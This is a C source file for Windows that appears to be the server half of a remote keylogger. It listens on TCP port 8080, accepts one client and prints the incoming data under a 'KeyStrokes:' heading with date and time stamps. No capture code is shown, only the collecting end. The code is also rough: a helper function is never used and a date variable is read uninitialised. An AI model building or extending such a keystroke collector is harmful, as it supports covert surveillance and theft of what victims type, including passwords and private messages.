#include <stdio.h>
#include <winsock2.h>
#include <unistd.h>

#define MSG_BUFF_LEN 5
#define ENTER 13
BOOL checkIfArrChanged(char newMsgBuff[MSG_BUFF_LEN], char prevMsgBuff[MSG_BUFF_LEN]) {
    int itrIdx;
    if (strlen(newMsgBuff) > strlen(prevMsgBuff)) return TRUE;  // added a new character
    else if (strlen(newMsgBuff) < strlen(prevMsgBuff)) return TRUE; // backspace
    else return FALSE;  // nothing changed
}

void deleteLine() {
    printf("\033[K");
}

void jumpDown() {
    printf("\033[B");
}

void jumpUp() {
    printf("\033[F");
}

void moveCursorToStartOfLine() {
    printf("\r");
}

int main() {
    SetConsoleOutputCP(CP_UTF8);

    WSADATA wsa;
    WSAStartup(MAKEWORD(2, 2), &wsa);

    SOCKET server_socket;
    server_socket = socket(AF_INET, SOCK_STREAM, 0);
    
    struct sockaddr_in server;
    server.sin_family = AF_INET;
    server.sin_addr.s_addr = INADDR_ANY;
    server.sin_port = htons(8080);

    bind(server_socket, (struct sockaddr*)&server, sizeof(server));
    listen(server_socket, 3);

    printf("Listening for Connection ... \n");
    struct sockaddr_in clientObject;
    int clientObjectLen = sizeof(clientObject);

    SOCKET client_socket = accept(server_socket, (struct sockaddr*)&clientObject, &clientObjectLen);
    printf("Client Connected\n");

    SYSTEMTIME st;
    GetLocalTime(&st);

    char newMsgBuff[MSG_BUFF_LEN];
    printf("KeyStrokes: \n");

    WORD dayVar;

    while (1) {
        int recievedMsg = recv(client_socket, newMsgBuff, sizeof(newMsgBuff) - 1, 0);
        if (recievedMsg > 0) {
            newMsgBuff[recievedMsg] = '\0';
            SYSTEMTIME st;
            GetLocalTime(&st);

            if (dayVar != st.wDay) {
                dayVar = st.wDay;
                printf("[%02d/%02d/%02d]\n", st.wMonth, st.wDay, st.wYear);
            }
            printf("  |  [%02d:%02d:%02d, ", st.wHour, st.wMinute, st.wSecond);
            printf("%s ]\n", newMsgBuff);
        }
    }
    return 0;
}